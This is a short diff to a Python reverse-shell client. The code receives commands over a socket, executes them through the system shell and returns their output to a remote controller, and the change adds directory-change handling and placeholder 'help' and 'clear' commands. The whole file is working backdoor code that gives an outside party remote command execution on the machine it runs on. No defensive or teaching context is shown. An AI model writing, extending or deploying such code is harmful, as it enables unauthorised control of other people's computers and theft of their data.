@@ -1,6 +1,7 @@
 import socket
 import json
 import subprocess
+import os
 
 def send_data(data):
 	jsondata = json.dumps(data)
@@ -21,10 +22,20 @@ def shell():
 		command = recv_data()
 		if command == "quit":
 			break
-		execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		result = execute.stdout.read() + execute.stderr.read()
-		result = result.decode()
-		send_data(result)
+		elif command == "help":
+			pass
+		elif command == "clear":
+			pass
+		elif command[:3] == "cd ":
+			try:
+				os.chdir(command[3:])
+			except FileNotFoundError:
+				pass
+		else:
+			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			result = execute.stdout.read() + execute.stderr.read()
+			result = result.decode()
+			send_data(result)
 
 if __name__ == "__main__":
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
